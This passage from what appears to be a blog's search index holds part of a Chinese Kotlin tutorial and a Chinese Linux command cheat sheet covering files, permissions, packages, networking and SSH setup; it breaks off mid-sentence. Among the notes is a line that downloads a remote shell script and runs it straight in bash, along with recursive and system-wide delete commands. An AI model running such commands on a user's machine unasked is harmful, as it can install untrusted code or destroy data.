true);","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"使用Kotlin进行java开发","date":"2017-01-13T23:06:13.000Z","path":"2017/01/13/2017-01-13-embracing-kotlin/","text":"Kotlin是Jetbrain公司推出的面向jvm的语言，编译后的bytecode和java编写的代码并没有什么区别。 1. 基本语法 没有new关键字 主函数 fun main(args : Array&lt;String&gt;) { for (i in args.indices) { print(args[i]) } } 自定义函数 fun getStringLength(obj: Any) :Int?{ //问号代表有可能返回空值 if (obj is String) { return obj.length } return 0 } 支持lambda fun maps(list: List&lt;String&gt;) { list.filter { it.startsWith(&quot;a&quot;) } .sortedBy { it } .map(String::toUpperCase) .forEach(::print) } 对于函数有新的认识了 public fun isOdd(number: Int) = number % 2 != 0 // 函数也可以用一个等式来表达了 public fun isOdd2(number: Int) :Boolean { //这种就啰嗦点 return number % 2 != 0 } 2. 集合相关常用的迭代一个range的方式 for (i in 1..3) { println(i) //这个打印出来是1，2，3 } for (i in 6 downTo 0 step 2) { println(i) } //这个打印出来是6 4 2 0 //带index的迭代一个集合的方式 val quoteParts = &quot; YOU JUST TALKED TO MUCH !&quot;.split(&quot; &quot;) for ((index, value) in quoteParts.withIndex()) { print(&quot;reading index $index: $value &quot;) } //和java定义的List interface不一样，Kotlin定义的interface默认是没有add,remove这些修改性质的方法的。 // 比如说有一个int，想凑到String + int中，不需要String.format了，kotlin给String加上了一个format的ententsion Function，更简单的方式是直接加上美元符号引用即可。感觉和es6很像。 // List&lt;out T&gt;这种集合默认只提供了只读的方法，比如get ,size。想要更改内容需要使用MutableList接口提供的方法 // 直接看代码的话，一个提供了readOnlyMethod，修改(add ,remove ,set ...)的方法是通过MutableList提供的 val numbers: MutableList&lt;Int&gt; = mutableListOf(1, 2, 3) val readOnlyView: List&lt;Int&gt; = numbers //将原先一个可修改的List包装成一个“只读”的List println(numbers) // prints &quot;[1, 2, 3]&quot; numbers.add(4) println(readOnlyView) // prints &quot;[1, 2, 3, 4]&quot; 但是不完全只读，通过修改底层list还是能只读 readOnlyView.clear() // -&gt; does not compile val items = listOf(1, 2, 3) //彻底的只读 public interface MutableList&lt;E&gt; : List&lt;E&gt;, MutableCollection&lt;E&gt; { override fun clear(): Unit public fun add(index: Int, element: E): Unit } 读取一个List的元素推荐使用数组下标 items.get(0) //ide会提示推荐使用下面这种方式 items[0] // map也是，推荐通过类似于数组下标的方式去获取value 3. implementing an interface not like in java如果接口只有一个方法简单用lambda button.setOnClickListener( { v-&gt; System.out.print(v.id)}) 如果有多个方法，语法就显得啰嗦的多 val handler = object : DisposableObserver&lt;Bitmap&gt;() { override fun onError(e: Throwable) { LogUtil.d(&quot;e&quot;) } override fun onNext(t: Bitmap) { image_two!!.setImageBitmap(t) } override fun onComplete() { LogUtil.d(&quot;completed&quot;) } } 提到lambda，可以认为就是一个要执行的规则 fun logExecution1(func: () -&gt; String){ Log.d(&quot;tag&quot;,&quot;before method call&quot;) func() Log.d(&quot;tag&quot;,&quot;after method call&quot;) } logExecution1({ val result = &quot;name&quot; result }) 在high order function的领域里，这就算传入了一个返回值为String的函数，用lambda的话，返回值就不用写return了。好像使用高阶函数，只能这么写lambda.lambda的函数的写法相当邪乎，用两个分号包起来，里面一行行的写，最后也不用写返回值 4. 没有new关键字了class somClass{ fun printMsg(msg : String){ println(msg) } } fun main(args: Array&lt;String&gt;){ val instance = somClass() // 直接把new给删了 instance.printMsg(&quot;Hey there&quot;) } 5. java Bean不需要写废话了data class SomeThing(val id: Int) //用的时候 val instance = SomeThing(10) //这种data class会主动对外提供非private属性(都不能叫Field了)的访问权（类似get set）。有些get方法会刻意复写getter private val foo = calcValue(&quot;foo&quot;) //这个只会在第一次访问属性的时候调用这个方法 private val bar get() = calcValue(&quot;bar&quot;) //主动添加的get方法，意味着每次调用属性都会调用这个方法 private fun calcValue(name: String): Int { println(&quot;Calculating $name&quot;) return 3 } // 自定义getter和setter var stringRepresentation: String get() = this.toString() set(value) { setDataFromString(value) // parses the string and assigns values to other properties } 对于不希望生成getter和setter的filed，使用@jvmFiled的注解标识即可 6. 具有更好语义的typealistypealias CustomerName = String data class Customer(val name: CustomerName,val email: String) 跟linux上的alias差不多，CustomerName其实就是String，但使用typealias使得传数据时更不容易错误。 7. switch case用when来写fun returnSomeThing(input :Any) : String{ val actual = when(input){ 1 -&gt; { println(&quot;1&quot;) } 2 -&gt; { println(&quot;2&quot;) } is Int -&gt; { println(&quot;is Int&quot;) } else -&gt;{ println(&quot;don&#39;t know which one&quot;) } } return actual.toString() } // when ... is ...是根据传入的object的class类型来进行判断的 when (x) { is Foo -&gt; ... is Bar -&gt; ... else -&gt; ... } 8. 能够接受一个函数作为参数在调用一些资源的时候，经常需要用完了关闭掉 fun using(resource: Closeable, body: () -&gt; Unit) { try { body() }finally { resource.close() } } val inputstram = FileInputStream(&quot;/&quot;) as FileInputStream using(inputstram){ // do stuff with this resource // it will close for you } 9. 获取this使用this@MyActivity即可 10. findViewById怎么写 changeval listView = findViewById(R.id.list) as ListView toval listView = findViewById(R.id.list) 参考 封装： fun &lt;V : View&gt; Activity.bindView(id: Int): Lazy&lt;V&gt; = lazy { viewFinder(id) as V } private val Activity.viewFinder: Activity.(Int) -&gt; View? get() = { findViewById(it) } 之后我们就可以在 Activity 中这样注入 View 了 val mTextView by bindView&lt;TextView&gt;(R.id.text_view) 11.extends需要把parentClass设置为openopen class MySuperClass(parameter:String) class MyClass2 { object AnonymousSubClass:MySuperClass(&quot;something&quot;),MyInterface1,MyInterface2 { } } 12.没有static 关键字了，静态方法的写法class Controller { private val _items = mutableListOf&lt;String&gt;(&quot;1&quot;,&quot;2&quot;,&quot;4&quot;) val items: List&lt;String&gt; get() = _items.toList() companion object { fun checkType(args:Any?){ when(args){ is String -&gt; println(&quot;This is an String Type&quot;) is Int -&gt; println(&quot;This is Some Integer Number &quot;) else -&gt; println(&quot;i don&#39;t recognize this format doom.....&quot;) } } } } //外部调用 Controller.checkType(10) // -&gt; This is Some Integer Number //在另一个class中调用Controller.Companion.checkType(18) //和static方法一样，如果方法是private的话，外部也访问不了 所以比如说像Constants这样的东西，也要丢到companion object中了 13. class castval modifiableMap :MutableMap&lt;String,String&gt; = unmodifiableMap as MutableMap&lt;String, String&gt; //使用as关键字 14. by lazy和lateinit的区别参考 val myUtil by lazy { MyUtil(parameter1, parameter2) } // 第一次调用myUtil的时候会调用 val instance :HashMap&lt;String,String&gt; by lazy { HashMap&lt;String,String&gt;() } //所以看上去就特别适合作为instance //官方推荐的实现singleton的方式 object Resource { val name = &quot;Name&quot; } lateinit var myUtil: MyUtil // 使用的时候 myUtil = MyUtil(parameter1, parameter2) // 这明显是把变量的初始化与定义分离开了。 显然的区别是一个是val 一个是var。 如果是值可修改的变量（即在之后的使用中可能被重新赋值），使用 lateInit 模式如果变量的初始化取决于外部对象（例如需要一些外部变量参与初始化），使用 lateInit 模式。这种情况下，lazy 模式也可行但并不直接适用。如果变量仅仅初始化一次并且全局共享，且更多的是内部使用（依赖于类内部的变量），请使用 lazy 模式。从实现的角度来看，lateinit 模式仍然可用，但 lazy 模式更有利于封装你的初始化代码。 15. NPE还是会有的val files = File(&quot;&quot;).listFiles() println(files.size) // crash val files = File(&quot;&quot;).listFiles() println(files?.size) // 输出 null ?的意思类似于优先判空 16. let ,apply ,with,run方法/** * Calls the specified function [block] with `this` value as its argument and returns its result. */ // let，其实就是一个实例化的对象上添加一个extension method val result =&quot;Hello World&quot;.let { println(it) //这个it是一个关键字 520 } println(result) 输出 &quot;Hello World&quot; 520 //这个时候的result就已经是520了 // 如果不为Null的话，执行下面这一段代码块 val value = ... value?.let { ... // execute this block if not null } apply的用法val name = “myName”.apply { toUpperCase() }print(name) //出来的还是myName，也就是说apply里面的东西不会对值产生影响 17. with关键字用于同时调用一个Instance 的多个methodclass Turtle { fun penDown() fun penUp() fun turn(degrees: Double) fun forward(pixels: Double) } val myTurtle = Turtle() with(myTurtle) { //draw a 100 pix square penDown() for(i in 1..4) { forward(100.0) turn(90.0) } penUp() } // java7 的try with resources val stream = Files.newInputStream(Paths.get(&quot;/some/file.txt&quot;)) stream.buffered().reader().use { reader -&gt; println(reader.readText()) } 18. class还是File新建一个class和新建一个File有什么区别，File里面可以写多个class，每个class都是类似于java中static inner class，互相之间是不能引用到的。内部类不是像Java那样写在里面就能引用到外部类了，kotlin写在里面的class默认是引用不到外面class的field和方法的，需要给内部class加上inner关键词。 java里面写习惯了.class对象，在kotlin中得这么写: retrofit.create(ApiStores.class) //java写法 retrofit.create(ApiStores::class.java) // kotlin写法 init函数和constructor是有区别的What are the Kotlin class initialisation semantics? .简单来说，init函数 19. ? extends T怎么写var lst = ArrayList&lt;Class&gt;()lst.add(Noun_Class::class.java) class的主构造函数中是不能包含任何code逻辑的 stackoverflowinit代码块不是构造函数，同时，init的执行效果要看写在哪一行了，如果在Init中引用了一个propertity，这个属性要是在Init之前就初始化了那倒还好，要是在后面,那么在init调用的时候看到的就是null.(其实编辑器这时候就会警告的) class Person { /*主构造*/ constructor() { println(&quot;constructor1&quot;) } /*属性*/ private var gender: Boolean = true /*伴生对象*/ companion object { val instance: Person by lazy { Person(&quot;yzq&quot;, 26) } /*伴生对象中的初始化代码*/ init { println(&quot;companion init 1&quot;) } init { println(&quot;companion init 2&quot;) } } /*次构造方法*/ constructor(name: String, age: Int) : this() { println(&quot;constructor2&quot;) } /*初始化代码块*/ init { println(&quot;Person init 2,gender:${gender}&quot;) } /*初始化代码块*/ init { println(&quot;Person init 1&quot;) } } 初始化的时候打印结果:companion init 1companion init 2Person init 2,gender:truePerson init 1constructor1constructor2自己感受下这个顺序 @Insert fun insertAll(vararg users: User) //这个vararg等于java里面的...就是一个数组的意思 forEach在Android上可能会崩fun test1(){ hashMapOf(&quot;a&quot; to &quot;b&quot;).forEach { t, u -&gt; } } fun test2(){ hashMapOf(&quot;a&quot; to &quot;b&quot;).forEach { (t, u) -&gt; } } test1使用的是java 8的BiConsumer，在低版本(api 24以下)会崩，第二种使用的是常规的Iterator方法 参考 Kotlin in production 10 Kotlin Tricks in 10 ish minutes by Jake Wharton​ Try Kotlin What can Kotlin do for me? (GDD Europe ‘17)KotlinConf 2017 - Deep Dive into Coroutines on JVM by Roman Elizarov coroutine在jvm上的实现原理getting-started-with-coroutines-on-android","tags":[{"name":"kotlin","slug":"kotlin","permalink":"https://haldir65.github.io/tags/kotlin/"}]},{"title":"linux基本命令介绍","date":"2017-01-07T15:38:43.000Z","path":"2017/01/07/2017-01-07-Linux-Basic-Commands/","text":"一些常用的linux基本命令,仅作为参考。 nohup node server.js &gt; /dev/null 2&gt;&amp;1 &amp; 首先是连接vps的ssh(Secure Shell)工具，putty或者xshell都可以,putty改颜色教程。 重启 reboot关机 shutdown -h now #或者 halt 速查手册 文件操作 Vi文本编辑器 bash脚本怎么写 用户和用户组的问题 文件权限 管道 硬件相关的命令 软件的安装，卸载 网络监控 查看进程 通用配置 参考 另外一篇关于linux命令的补充 1. 文件操作常用命令- &gt; cd //进入目录 - &gt; cd / 返回根目录 - &gt; pwd // 显示当前目录 (print working directory) - &gt; ls // 显示当前目录下内容 - &gt; ll = ls -al ## 这时候发现有些文件名后面跟着一个星号，这说明这个文件是可执行的 # ls -halt is for human readable, show hidden, print details, sort by date ls –l –R(或-lR) src &gt; list.txt ##列出文件列表 cd - //回到你刚才的目录 ll -trh ## 按照modify time倒序排列（-t sort by modification time，-r reverse order while sorting） - &gt; mkdir //新建目录 - &gt; rmdir //删除目录,如果目录不为空， - &gt;使用 rm -r //递归删除 - &gt; rm -rf //强制删除 文件名一般不支持空格，如果真有的话得用单引号括起来，像这样: -&gt; rm -f &#39;my file&#39; -&gt; mv a.mp4 b.mp4 //mv虽然是移动（Windows中的剪切）操作，但这种情况下就等同于重命名了，亲测有效 # 重命名 rename是实际意义上的重命名命令，但rename接受三个参数 - &gt; touch filename //创建文件，后缀在linux下没意义 另外,touch 命令主要是用来改文件的时间戳的 - &gt; touch -t 201707081238.34 file.txt //把这个文件的时间戳改成2017年XXX。。。 复制粘贴： - &gt; cp a b //把a复制一份，命名为b - &gt; cp d1 d2 // 这样是不行的，复制目录需要加上-r ，即 - &gt; cp -r d1 d2 移动(左边是被移动的文件或目录，右边是目标路径)： - &gt; mv d1 / 把d1移动到相对路径，也就是根目录下 - &gt; mv d1 ../把d1往上移动一层 - &gt; mv d1 ../../ 重定向重定向输出 &gt; ls &gt; lsoutput.txt #用于将输出的结果写入一个新的文本文件中 cat &gt; newfile // 所以重定向也能用于创建新的文件 echo &#39;hey man&#39; # 类似于print echo &#39;hello&#39; &gt; log.txt #把这句话写入到文本中 ，覆盖其原有内容 printf &quot;hello world\\n&quot; //linux里面这样也是可以输出的，几乎就和c语言语法一致了 echo $((2+2)) ##shell里面也是能够进行加减乘除的，需要两个parentheses.当然这里只能处理小数,2.3直接向上变成3 &gt;&gt; 表示追加，不覆盖,append ###重定向输入 &lt; wall &lt; aa.txt # wall是向所有用户发广播， 即从aa.txt中读取内容，然后广播发出去 bash &lt;(curl -L -s https://install.direct/go.sh) // 比如说随便从网上下一个sh文件下来，然后用bash执行 #service命令 service XXX start/stop/status #原理是将这些程序注册成为系统服务，这样调用这些程序的时候就不需要写一大堆绝对路径了，具体用法help已经很详细了。 zip –q –r video.zip /home/video zip –q –r video.zip . # .代表当前目录 建议加上-v，不然等很久 2. Vi文本编辑器- &gt; vi 3.txt // 如果有则编辑，没有则直接创建 ## 跳到文件开头处 [[ ##跳到文件结尾处 ]] ##Vi分为命令模式和编辑模式，一进来是命令模式，输入&#39;a&#39;进入编辑模式 ##切换回命令模式按&#39;esc&#39; ## 命令模式下 :w 表示存盘 - :q 退出 - :wq 保存并退出 - :q! 不保存退出（无内容变化） yy、Y 复制当前光标所在的行 nyy 复制当前光标所在处以及以下的n行 dd ：剪切当前光标所在处的行 ndd ：剪切当前光标所在处及以下的n行 p：在当前光标处下面粘贴内容。 P：在当前光标处上面粘贴内容。 在编辑模式下,输入 ‘dd’删除一行 ，输入’dw’删除一个词输入’o’插入一行。。。。。。 - &gt; more filename//查看文件内容(一页一页的显示档案内容) - &gt; less filename// 也是查看(less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！) - &gt; cat filename //正序查看文件内容 - &gt; tac filename //逆序查看文件内容 - &gt; nl： 显示的时候，随便输出行号！ - &gt; more： 一页一页的显示档案内容 - &gt; less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！对less显示出的内容中可以使用 /&#39;字符&#39; 输入需要查找的字符或者字符串并高亮显示，而more 不具备(亲测很好用) - &gt; less +F ##和tail -f差不多，这个➕要有的，搭配ctrl+c ,shift-f ,q - &gt; head： 查看头几行 - &gt; tail： 查看尾几行 - &gt; head - 3 filename //只查看文件前面三行 - &gt; tail - 3 filename //只查看倒数后三行 - &gt; tail -n 3 filename //和上面是一样的 看binaryFile不能用cat how to view a file (text or binary) in binary format xxd -b fileName //binary xxd file // hex format od -xc //binary format hd file // symboloc link to hexdump - &gt; od： 通常使用od命令查看特殊格式的文件内容。通过指定该命令的不同选项可以以十进制、八进制、十六进制和ASCII码来显示文件。 d 十进制 o 八进制（系统默认值） x 十六进制 n 不打印位移值 od -c filename(以字符方式显示) od -Ax -tcx4 filename(以十六进制和字符同时显示) tail还有一个好处，可以实时查看文件内容，比如文件正在更新，可以实时查看最新的日志 tail -f /var/log/messages 亲测，一个10MB的log文件，就这么cat的话，会把putty搞死 所以后台开发就喜欢这么干: tail一个日志，狂按回车键，然后用客户端访问某个url，看下有没有报错。 更多命令如 find 、 whereis 、 Li(Link)查找： find / -name filename //在根目录下查找文件 find /etc -name filename //在etc目录下查找文件 ## 在当前目录下找所有类型为目录的文件，最多往下找三层 find . -maxdepth 3 -type d ## 下面这个就是找到了并且删除 sudo find / -name .DS_Store -delete sudo find / -name &quot;.DS_Store&quot; -exec rm {} \\; grep stringtofind filename //在指定的文本文件中查找指定的字符串 whereis ls //查看ls命令所执行的是哪个文件及其位置(查看系统文件所在路径) 快捷键sudo !! - re-run previous command with ‘sudo’ prepended ##敲命令忘记加sudo了，直接sudo!!，把上一个命令加上sudo执行一遍ctrl-k, ctrl-u, ctrl-w, ctrl-y - cutting and pasting text in the command lineuse ‘less +F’ to view logfiles, instead of ‘tail’ (ctrl-c, shift-f, q to quit)ctrl-x-e - continue editing your current shell line in a text editor (uses $EDITOR)alt-. - paste previous command’s argument (useful for running multiple commands on the same resource) ctrl + r 查找历史命令 4. 用户和用户组的问题id userName // 查看当前用户的信息，比如是不是sudo之类的 useradd user //添加用户，(-g 指定用户所在用户组)/home目录下会多一个user的目录，作为该用户的主目录 sudo su - userName // 从root直接切到userName，具有sudo权限 给一个user管理员权限: usermod -aG sudo userName passwd user //设置user的密码，会提示输入密码，密码不会显示在窗口中 cd /etc &gt;&gt;&gt; more passwd ，这里面会显示所有的用户 more group ,显示用户组的信息 groupadd groupname //添加一个用户组 //删除用户 userdel user //删除一个用户 这么删除还没删干净，需要把/home/username删掉 还需要删除该用户的主目录(rm -rf user) 重启机器，登录页面选择新用户即可完成用户切换 或者使用 su testuser 切换到testuser身份 exit就回到root用户的身份 禁止某个用户登录的原理 在/etc/shadow中存储了每个用户的密码的hash值，在前面有!的都是不能登录的 加!的方法: usermod -L username 解锁的方法: passwd username /etc/group存储了用户组的信息 /etc/shadow存储了密码的hash值 /etc/passwd存储了系统中所有用户的主目录路径，例如/home/username 新用户登录时，默认的是该用户的主目录 ~/ 5. 文件权限的问题ls命令执行显示的文件前一般带有一串信息第一位： 代表文件l代表链接d代表目录 后面九位划分为三块，可能的权限有这么几种r(read权限)w(写权限)-(无权限)x(执行权限) 第一组代表所有者(u)权限，第二组代表与所有者一个用户组的用户(g)的权限，第三组代表其他用户(O)的权限user,user group还有other 更改文件权限命令: chmod(个人测下来要加sudo才行) sudo chmod +x filename //加上可执行权限，所有用户都加上了 sudo chmod u+x filename //给当前用户加上可执行权限 u：用户 g：组 o：其它用户 a：所有用户 ```bash $chmod a+x main 对所有用户给文件main增加可执行权限 $chmod g+w blogs 对组用户给文件blogs增加可写权限 //其他命令不一一列举 u ：目录或者文件的当前的用户 g ：目录或者文件的当前的群组 o ：除了目录或者文件的当前用户或群组之外的用户或者群组 a ：所有的用户及群组 r ：读权限，用数字4表示 w ：写权限，用数字2表示 x ：执行权限，用数字1表示 ：删除权限，用数字0表示 所以给所有用户增加a.txt文件的可执行权限就像这样chmod a+x a.txt #其余自行发挥chmod a-x a.txt #删除所有用户的可执行权限chmod o-w ##从owner手中收回write权限 chmod 755 filename751应该是读/写/执行chomod 444 filename# 为所有用户分配读权限chmod 777 filename //全部权限都有了，其实上面的9位就是这三位数每一位的二进制拼起来的755 就是 111101101,也就对应上面的权限九位字母 chown -R Jane /foldername # 把flodername文件夹的所有者改为Jane， -R 表示递归，会保证所有子文件夹的所有者也被更改 更改文件所有者 &gt; chown username filename ### 6. 管道 将一个命令的输出传送给另一个命令，作为另一个命令的输入 eg: 中间那条竖线叫做管道连接符 ```bash $ cat /etc/passwd | grep usernametofind $ ls -l | grep &quot;^d&quot; $ ls -l * | grep &quot;^-&quot; | wc -| //&quot;^-&quot;表示不列出目录或链接，只展示目录；wc是数行数 $ ls -l | grep &quot;^d&quot; //只列出目录 我想知道java这个程序在哪里，同时把结果弄到剪切板上在mac上可以这么干,使用pbcopy命令 cat ~/.bashrc | pbcopy ## 剪切板内容： /usr/bin/java 那么在linux上呢？ which java | ??? 然而linux并未自带这个功能。pipe output to clipboardwin sudo apt-get install xclip cat file | xclip ## 复制 xclip -o ## 粘贴 7. 硬件相关的命令查看硬盘存储空间: df -h //h的意思是human-readable du -sh //查看当前directory的大小 du -sh * //du --summary --human-readable * 查看当前目录下所有文件和子目录的总大小 du -h //查看当前目录下各个子目录分别的大小 dh -h img// 查看img目录下文件及文件夹的大小 dh -h img/1.jpg //查看指定文件的大小 du -hsBM //查看当前目录的大小(s表示summary)，以MB为单位 du -hsBM /var/* | sort -n //查看/var目录下全部文件，从小到大排列 查看cpu信息 &gt; cat /proc/cpuinfo 查看内存 &gt; cat /proc/meminfo | grep Mem &gt;free -m free -h # human readable 修改默认安全设置 &gt; vi /etc/ssh/ssd_config 添加或修改 Port 22 (ssh默认端口修改) PermitRootLogin without-Password no AllowUsers userName 把登录端口改大一点还是很有必要的，亲测不难 vi /etc/ssh/sshd_config service ssh restart 搞定 看下成功登录历史 - last | less | sort -rn ### who 命令更好，是指wtmp文件创建以来的登录记录 who /var/log/wtmp 压缩文件命令将/home/video/ 这个目录下所有文件和文件夹打包为当前目录下的video.zip zip –q –r -v video.zip . #加上一个-v主要是为了能够实时查看输出 顺便说一下，tar打出来的.tar包在windows下是不认的，需要装7-zip之类的软件。zip打出来的包windows下是认的。 文件传输（linux -&gt;windows）： 一般使用putty ssh到Linux主机，想要把Linux上的文件弄到Windows中，需要使用pscp工具。下载好pscp.exe后，放到c:/windows/system32下面。打开cmd。输入命令 pscp -r root@202.123.123.123:&quot;/root/fileonServer.mp4&quot; d:/whateveriwantonmyPc.mp4 ，确认后输入root密码就好了。我主要是用来下载视频的。有时候会出现Connection Refused Error。 &gt; netstat -anp | grep sshd 看下跑在哪个端口然后 pscp -P 12345-r root@202.123.123.123:”/root/fileonServer.mp4” d:/whateveriwantonmyPc.mp4 ## -p要大写 8. 软件的安装，卸载(dpkg命令，不要只会apt-get) 在debian下，你可以使用dpkg(Debian package system)来安装和卸载软件包。 还是那句话，没事不要手贱升级软件 ### （1）移除式卸载： apt-get remove softname1 softname2 …; （移除软件包，当包尾部有+时，意为安装） ### （2）清除式卸载 ： apt-get --purge remove softname1 softname2...;(同时清除配置，删干净) ### 清除式卸载： apt-get purge softname1 softname2...;(同上，也清除配置文件) ### （1）移除式卸载： dpkg -r pkg1 pkg2 ...; ###（2）清除式卸载： dpkg -P pkg1 pkg2...; ### 使用dpkg安装deb包 dpkg -i tcl8.4_8.4.19-2_amd64.deb ###使用kpkg -r来删除deb包 dpkg -r tcl8.4 参考Ubuntu 中软件的安装、卸载以及查看的方法总结 关于apt-get apt-cache search # ------(package 搜索包)就是看下符合这个名称的在repository中包有哪些 apt-cache show #------(package 获取包的相关信息，如说明、大小、版本等) apt-get install # ------(package 安装包) apt-get install # -----(package --reinstall 重新安装包) apt-get -f install # -----(强制安装, &quot;-f = --fix-missing&quot;当是修复安装吧...) apt-get remove #-----(package 删除包) apt-get remove --purge # ------(package 删除包，包括删除配置文件等) apt-get autoremove --purge # ----(package 删除包及其依赖的软件包+配置文件等（只对6.10有效，强烈推荐）) apt-get update #------更新源 apt-get upgrade #------更新已安装的包，不会移除任何包 apt-get dist-upgrade # --------- 更新包，但如果有些已安装的包被被标记为需要移除的话，会移除包 apt-get dselect-upgrade #------使用 dselect 升级 apt-cache depends #-------(package 了解使用依赖) apt-cache rdepends # ------(package 了解某个具体的依赖,当是查看该包被哪些包依赖吧...) apt-get build-dep # ------(package 安装相关的编译环境) apt-get source #------(package 下载该包的源代码) apt-get clean &amp;&amp; apt-get autoclean # --------清理下载文件的存档 &amp;&amp; 只清理过时的包 apt-get check #-------检查是否有损坏的依赖 dpkg -S filename -----查找filename属于哪个软件包 apt-file search filename -----查找filename属于哪个软件包 apt-file list packagename -----列出软件包的内容 apt-file update --更新apt-file的数据库 dpkg --info &quot;软件包名&quot; --列出软件包解包后的包名称. dpkg -l --列出当前系统中所有的包.可以和参数less一起使用在分屏查看. (类似于rpm -qa) dpkg -l |grep -i &quot;软件包名&quot; --查看系统中与&quot;软件包名&quot;相关联的包. dpkg -s 查询已安装的包的详细信息. dpkg -L 查询系统中已安装的软件包所安装的位置. (类似于rpm -ql) dpkg -S 查询系统中某个文件属于哪个软件包. (类似于rpm -qf) dpkg -I 查询deb包的详细信息,在一个软件包下载到本地之后看看用不用安装(看一下呗). dpkg -i 手动安装软件包(这个命令并不能解决软件包之前的依赖性问题),如果在安装某一个软件包的时候遇到了软件依赖的问题,可以用apt-get -f install在解决信赖性这个问题. dpkg -r 卸载软件包.不是完全的卸载,它的配置文件还存在. dpkg -P 全部卸载(但是还是不能解决软件包的依赖性的问题) dpkg -reconfigure 重新配置 apt list --upgradable ## 看一下哪些程序可以更新 install snap package(通常通过apt-get install软件时候会顺带将该软件所需要的依赖也安装下来，下次装一个其他软件的时候如果有类似的依赖，就直接用了。而snap package本身就bundle了所需的依赖)。这个概念还比较新，仅限于ubuntu,debian也没有。 9. 网络监控tcpdump结合wireshark可实现完整的网络抓包，这个放在下面写。 netstat netstat -i ## 查看某个网络接口发出和接收了多少byte的数据 netstat -ta ##当前active的网络连接 t: tcp a: all u: udp p:process netstat -tan ##以ip地址的方式展示出来 n: 禁止域名解析，就是不显示域名，直接显示ip netstat -tupln ##tcp+udp+program name+监听的端口+numerically netstat -ie ##比较友好的方式展示当前各个端口的流量，就是显示每个网卡发送的流量，接收的流量一共多少MB,这种 netstat -nlpt ##获取进程名、进程号以及用户 ID netstat -s ##可以打印出网络统计数据，包括某个协议下的收发包数量。 netstat -ct ## c:持续输出 netstat -tn ## netstat -lnput ## check Active Internet connections (only servers) ## 使用watch命令监视active状态的连接，实时显示网络流量 watch -d -n0 &quot;netstat -atnp | grep ESTA&quot; ## 列出当前所有连接到本机的远程ip地址并排序 netstat -tn 2&gt;/dev/null | grep :80 | awk &#39;{print $5}&#39; | cut -d: -f1 | sort | uniq -c | sort -nr | head ifconfig ## 查看机器上的网卡,不过ifconfig已经被deprecated很久了，以后要习惯使用ip命令 en01 ##Ethernet ##注意 RX bytes(接收到的数据)和TX bytes(发送出去的数据)后面的数字 curl ipinfo.io/ip ## 查看本机的外网地址 ip address show //类似的命令，据说多数distribution打算用ip替代ipconfig ip addr show //和上面一样 ip a //也一样 cat /etc/network/interfaces systemctl status NetworkManager ## 查看维护系统网络的daemon systemctl restart NetworkManager ## 重启networkManager 10.查看进程起一个进程，后台运行，关掉终端照样跑的那种 nohup node server.js &gt; /dev/null 2&gt;&amp;1 &amp; nohup node server.js &gt; /dev/null 2&gt;&amp;1 &amp; 1. nohup means: Do not terminate this process even when the stty is cut off. 2. &gt; /dev/null means: stdout goes to /dev/null (which is a dummy device that does not record any output). 3. 2&gt;&amp;1 means: stderr also goes to the stdout (which is already redirected to /dev/null). You may replace &amp;1 with a file path to keep a log of errors, e.g.: 2&gt;/tmp/myLog 4. &amp; at the end means: run this command as a background task. 其实用supervisor也可以nohup的解释 top 动态显示 PID：进程的ID[参数解释](http://www.cnblogs.com/gaojun/p/3406096.html) USER：进程所有者 PR：进程的优先级别，越小越优先被执行 NInice：值 VIRT：进程占用的虚拟内存 RES：进程占用的物理内存 SHR：进程使用的共享内存 S：进程的状态。S表示休眠，R表示正在运行，Z表示僵死状态，N表示该进程优先值为负数 %CPU：进程占用CPU的使用率 %MEM：进程使用的物理内存和总内存的百分比 TIME+：该进程启动后占用的总的CPU时间，即占用CPU使用时间的累加值。 COMMAND：进程启动命令名称 ps a 显示现行终端机下的所有程序，包括其他用户的程序。 **看下某个进程跑在哪个端口** netstat -anp | grep sshd ps | grep 类似于 pgrep XXX //查找某个进程 pgrep -lf ss //找到sshd,nginx这些进程 进程命令 *实时监控，1秒刷新一次* watch -n 1 ps -aux --sort=-pmem,-pcpu #列出所有端口的占用情况 netstat -anp lsof -i # 这个也行 #查看哪个进程占了http端口(其实就是80了) lsof -i:80 #查看某个进程占了哪些端口 netstat -anp|grep pid lsof //list opened files ##看下mysql用了哪些文件 lsof -c mysql ## 查看端口占用 sudo lsof -iTCP ##只显示TCP端口 sudo lsof -iUDP ## 只显示UDP端口 sudo lsof -iTCP -sTCP:LISTEN ## 查看所有处于listen状态的 sudo lsof -iTCP -sTCP:ESTABLISHED ## ESTABLISHED状态的 [lsof命令还是很强大的](http://www.cnblogs.com/peida/archive/2013/02/26/2932972.html) ## 杀进程（如果进程不属于当前用户，要sudo） ## 杀进程，慎用。 kill -9 进程id // 9直接干掉进程，慎用。。。 kill pid // 这个和kill 15是一样的 //15表示terminate,请求进程停下来 kill -l //告诉你kill可以传哪些参数 在linux上输出是这样的： &gt; HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM 16 CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL 30 SYS killall nginx -&gt;&gt; 干掉nginx的所有进程 pkill -u username //干掉所有属于某一个用户的ps Signal (信号) man signal 进程状态 runnable、sleeping、zombie、stop //更改友善度,数字越小越不友好 nice -n 15 /..... 命令path。启动的时候确定nice renice -s pid //更改友善度 df -ah // 查看mounted文件系统 proc 11 .常用配置 查看登陆失败日志 grep “Failed password for root” /var/log/auth.log | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more //其实就是去一个文件里面查看第一列的内容，然后uniq并且sort一下 防范措施修改登陆端口号 sudo vi /etc/ssh/sshd_config Port 4484 PermitRootLogin no ###改了sshd_config之后千万记得重启ssh服务，不然会出现connection refused. /etc/init.d/ssh restart ##CentOS 重启SSH ： service sshd restart ###DeBian重启SSH： service ssh restart 查看系统release版本 more /etc/*release ### 这个也行 lsb_release -a 直接通过ssh服务登录 ssh username@you.ip.address -p 22 ## 会提示输入密码的 mac上使用ssh 免密码登录远程server的方式首先在本地使用keygen生成一个id_rsa_pub_xxx文件，多个服务器的公钥名字还是取不同的好。输入passphrase的时候最好输入点什么，后面会用上。ssh-copy-id ~/.ssh/id_rsa_xxx.pub yourusernameonvps@123.123.123.123 // 把这个id_rsa_xxx.privatekey上传到远程服务器 ，会要求输入密码的这个时候如果查看服务器上的~/.ssh/authorized_keys 